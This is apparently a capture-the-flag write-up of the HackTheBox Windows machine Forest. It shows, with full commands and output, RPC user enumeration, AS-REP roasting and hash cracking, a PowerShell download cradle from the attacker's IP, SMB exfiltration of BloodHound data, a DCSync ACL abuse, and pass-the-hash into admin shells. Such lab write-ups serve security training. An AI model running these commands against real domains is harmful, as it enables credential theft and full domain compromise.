---
title: HTB: Forest
url: https://0xdf.gitlab.io/2020/03/21/htb-forest.html
date: 2020-03-21T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, ctf, htb-forest, nmap, active-directory, dig, dns, rpc, rpcclient, as-rep-roast, hashcat, winrm, evil-winrm, sharphound, smbserver, bloodhound, dcsync, aclpwn, wireshark, scheduled-task, htb-active, htb-reel, htb-sizzle, oscp-like-v2, oscp-like-v1, osep-like, oscp-like-v3, cpts-like
---

![Forest](https://0xdfimages.gitlab.io/img/forest-cover.png)

One of the neat things about HTB is that it exposes Windows concepts unlike any CTF I’d come across before it. Forest is a great example of that. It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell. Then I can take advantage of the permissions and accesses of that user to get DCSycn capabilities, allowing me to dump hashes for the administrator user and get a shell as the admin. In Beyond Root, I’ll look at what DCSync looks like on the wire, and look at the automated task cleaning up permissions.

## Box Info

| Name | [Forest](https://hackthebox.com/machines/forest)  [Forest](https://hackthebox.com/machines/forest) [Play on HackTheBox](https://hackthebox.com/machines/forest) |
| --- | --- |
| Release Date | [12 Oct 2019](https://twitter.com/hackthebox_eu/status/1215300155341266951) |
| Retire Date | 21 Mar 2020 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Forest |
| Radar Graph | Radar chart for Forest |
| First Blood User | 00:20:45[cube0x0 cube0x0](https://app.hackthebox.com/users/9164) |
| First Blood Root | 01:23:31[cube0x0 cube0x0](https://app.hackthebox.com/users/9164) |
| Creators | [egre55 egre55](https://app.hackthebox.com/users/1190)  [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` shows a lot of ports typical of Windows machines without the firewall:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.031s latency).
Not shown: 64742 closed ports, 769 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49697/tcp open  unknown
49898/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds

root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
Nmap scan report for 10.10.10.161
Host is up (0.030s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-14T11:34:51-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-14T18:34:52
|_  start_date: 2019-10-14T09:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.091s latency).
Not shown: 65457 open|filtered ports, 74 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
58399/udp open  unknown
58507/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds

```

This looks like a domain controller. I’ll also notice TCP/5985, which means if I can find credentials for a user, I might be able to get a an get a shell over WinRM.

### DNS - UDP/TCP 53

I can resolve `htb.local` and `forest.htb.local` from this DNS server:

```

root@kali# dig  @10.10.10.161 htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62514
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: bbee567cd8172763 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      A

;; ANSWER SECTION:
htb.local.              600     IN      A       10.10.10.161

;; Query time: 30 msec
;; SERVER: 10.10.10.161#53(10.10.10.161)
;; WHEN: Mon Oct 14 14:34:17 EDT 2019
;; MSG SIZE  rcvd: 66

root@kali# dig  @10.10.10.161 forest.htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.10.10.161 forest.htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12842
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: ca9fa59dce2451be (echoed)
;; QUESTION SECTION:
;forest.htb.local.              IN      A

;; ANSWER SECTION:
forest.htb.local.       3600    IN      A       10.10.10.161

;; Query time: 150 msec
;; SERVER: 10.10.10.161#53(10.10.10.161)
;; WHEN: Mon Oct 14 14:35:19 EDT 2019
;; MSG SIZE  rcvd: 73

```

But it doesn’t let me do a zone transfer:

```

root@kali# dig axfr  @10.10.10.161 htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

### SMB - TCP 445

Neither `smbmap` nor `smbclient` will allow me to list shares without a password:

```

root@kali# smbmap -H 10.10.10.161
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.161...
[+] IP: 10.10.10.161:445        Name: 10.10.10.161                                      
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied
root@kali# smbmap -H 10.10.10.161 -u 0xdf -p 0xdf
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.161
root@kali# smbclient -N -L //10.10.10.161
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.161]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

```

### RPC - TCP 445

I can try to check over RPC to enumerate users. BlackHills has a [good post on this](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/).

I’ll connect with null auth:

```

root@kali# rpcclient -U "" -N 10.10.10.161
rpcclient $>

```

I can get a list of users with `enumdomusers`:

```

rpcclient $> enumdomusers              
user:[Administrator] rid:[0x1f4]       
user:[Guest] rid:[0x1f5]               
user:[krbtgt] rid:[0x1f6]              
user:[DefaultAccount] rid:[0x1f7]      
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]                
user:[santi] rid:[0x480]

```

I can list the groups as well:

```

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]          
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]            
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]                 
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

```

I can also look at a group for it’s members. For example, the Domain Admins group has one member, rid 0x1f4:

```

rpcclient $> querygroup 0x200          
        Group Name:     Domain Admins     
        Description:    Designated administrators of the domain
        Group Attribute:7              
        Num Members:1                  
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]

```

That’s the Administrator account:

```

rpcclient $> queryuser 0x1f4            
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :   
        Dir Drive   :      
        Profile Path:      
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 07 Oct 2019 06:57:07 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT
        Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT
        Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000031
        padding1[0..7]...
        logon_hrs[0..21]...

```

## Shell as svc-alfresco

### AS-REP Roasting

I’ve covered Kerberoasting before in both [Active](/2018/12/08/htb-active.html#background) and [Sizzle](/2019/06/01/htb-sizzle.html#kerberoasting). Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF\_DONT\_REQUIRE\_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. I have a list of accounts from my RPC enumeration above. I’ll start without the SM\* or HealthMailbox\* accounts:

```

root@kali# cat users
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco

```

Now I can use the Impacket tool `GetNPUsers.py` to try to get a hash for each user, and I find one for the svc-alfresco account:

```

root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f

```

### Crack Hash

Now I can use `hashcat` to break the hash:

```

root@kali# hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
...[snip]...
$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$
5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004
d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice
...[snip]...

```

I see the password is “s3rvice”.

### WinRM

I’ll give these credentials a try with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), and it works:

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
                                                         
Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>

```

From here I can grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
e5e4e47a************************

```

## Privesc to Administrator

### Enumeration

#### SharpHound

With my shell, I’ll run [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) to collect data for [BloodHound](https://github.com/BloodHoundAD/BloodHound). I’ve got a copy of Bloodhound on my machine (you can use `git clone https://github.com/BloodHoundAD/BloodHound.git` if you don’t). I’ll start a Python webserver in the `Ingestors` directory, and then load it in to my current session:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")

```

Now I’ll invoke it:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice

```

The result is a zip file:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> dir

    Directory: C:\Users\svc-alfresco\appdata\local\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/18/2019   3:56 AM          12740 20191018035650_BloodHound.zip
-a----       10/18/2019   3:56 AM           8978 Rk9SRVNU.bin   

```

I’ll use `smbserver.py` to exfil the results. On my box:

```

root@kali# smbserver.py share . -smb2support -username df -password df
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed                                   
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed                                   
[*] Config file parsed                                   
[*] Config file parsed     

```

Now on Forest:

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.14.6\share /u:df df
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20191018035324_BloodHound.zip \\10.10.14.6\share\
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> del 20191018035324_BloodHound.zip   
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use /d \\10.10.14.6\share
\\10.10.14.6\share was deleted successfully.

```

#### Load Data

I covered the [installation of Bloodhound in my Reel writeup](/2018/11/10/htb-reel.html#bloodhound). I’ll load the data by clicking the 

![1571511000876](https://0xdfimages.gitlab.io/img/1571511000876.png)
button on the right side, and selecting my zip exfil. Under “Queries”, I’ll click “Find Shorter Paths to Domain Admin”, and get the following graph:

![1571511066627](https://0xdfimages.gitlab.io/img/1571511066627.png)

### Path

There’s two jumps needed to get from my current access as svc-alfresco to Administrator, who is in the Domain Admins group.

#### Join Exchange Windows Permissions Group

Because my user is in Service Account, which is a member of Privileged IT Account, which is a member of Account Operators, it’s basically like my user is a member of Account Operators. And Account Operators has Generic All privilege on the Exchange Windows Permissions group. If I right click on the edge in Bloodhound, and select help, there’s an “Abuse Info” tab in the pop up that displays:

![1571511287322](https://0xdfimages.gitlab.io/img/1571511287322.png)

This gives a full background as to how to abuse this, and if I scroll down, I see an example:

```

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

```

I could also use:

```

net group "Exchange Windows Permissions" svc-alfresco /add /domain

```

#### Grant DCSync Privileges

Now I’ll use the fact that members of the Exchange Windows Permissions group have WriteDacl on the domain. Again, looking at the help, it shows commands I can run:

```

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync

```

Once I do that, I can run a DCSync attack, either with [Mimikatz](https://github.com/gentilkiwi/mimikatz) locally, or with `secretsdump.py` from my Kali box, since DCSync only requires access to TCP 445, TCP 135, and a TCP RPC port (49XXX). (How did I know that? I’ll explore in [Beyond Root](#dcsync-ports).)

### Exploit

#### Timeout

As I started to try to execute this attack, trial and error had me confused. I’d add my user to the Exchange Windows Permissions group, and then run the necessary commands, and it wouldn’t work. And then I’d run `net user svc-alfreso`, and I wouldn’t be in the group anymore. It turns out there’s cleanup going on here (I’ll exploit it in [Beyond Root](#cleanup-script)), so I have to move fast.

#### Success

I’ll create a one-liner to run locally. I don’t need to pass credentials to the first command, because I’m already running as a user with those rights. I did have to pass credentials to the second command. My best guess is that the session doesn’t know yet about my being in the new group from the first command, and that passing credentials refreshes that.

```

Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync

```

If I run that on Forest, it returns without error:

```
*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync

```

And I can see the user in the new group:

```
*Evil-WinRM* PS C:\> net group 'Exchange Windows Permissions'
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members
-------------------------------------------------------------------------------
svc-alfresco             
The command completed successfully.

```

I can also run `secretsdump.py` and get hashes:

```

root@kali# secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...
[*] Cleaning up... 

```

### Alternative Tool: Aclpwn

There’s a tool that will automate this exploitation, [aclpwn](https://github.com/fox-it/aclpwn.py). When I run it, I pass it the user I want to start with, and what I want to get (domain access), and it looks for paths, asks me which path to use, and then run it:

```

root@kali# aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
[-] Invalid path, skipping
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
Please choose a path [0-1] 1
[-] Memberof -> continue
[-] Memberof -> continue
[-] Memberof -> continue
[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
[+] Re-bind successful
[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191019-215508.restore

```

### Dump Hashes

Now, I can run `secretsdump.py`:

```

root@kali# secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...

```

### Shell

With the hashes for Administrator, I can connect with a tool like `wmiexec`:

```

root@kali# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

```

I could also continue with Evil-WinRM:

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator

```

Either way, from there, I can grab `root.txt`:

```

C:\users\administrator\desktop>type root.txt
f048153f************************

```

## Beyond Root

### DCSync Ports

I got curious about what ports were involved in a DCSync attack. So, with Wireshark open, I ran my oneliner to give my user DCSync access. Then I started a capture on tun0, and ran `secretsdump.py`. Once all the hashes were done, I stopped the capture.

Under Statistics, there’s an option to see Conversations, which loads this:

![1571513636862](https://0xdfimages.gitlab.io/img/1571513636862.png)

I can see that my host initiated four connections, all TCP (otherwise UDP would have a number after it). Two were on 445, one on 135, and one to 49667. All of these ports were open in the `nmap`.

The connections to 135 were only to communicate the RPC port that I should next connect to. If I filter on that port (`tcp.port == 135`), I can see the connection is set up, and in the last packet before it’s taken down, there’s information about how to connect, including the IP and port:

![1571513839007](https://0xdfimages.gitlab.io/img/1571513839007.png)

### Cleanup Script

I had issues with the user svc-alfresco being removed from groups after I added him. In the Administrator’s documents folder, I found the following script:

```

C:\users\administrator\documents>type revert.ps1
Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)

{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}

```

It loops doing the following:
- Sleep for 60 seconds.
- Resets the password for svc-alfresco to “s3rvice”.
- Loops over each user in `users.txt` in the Administrators documents folder.
- For each user, it removes the DCSync rights, and removes the user from all groups that are not named “Service Accounts”

This script must start on login or at boot. If I get a list of all scheduled tasks, I see a potential one right at the top:

```

C:\>schtasks /query /fo TABLE

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
restore                                  N/A                    Running        
...[snip]...

```

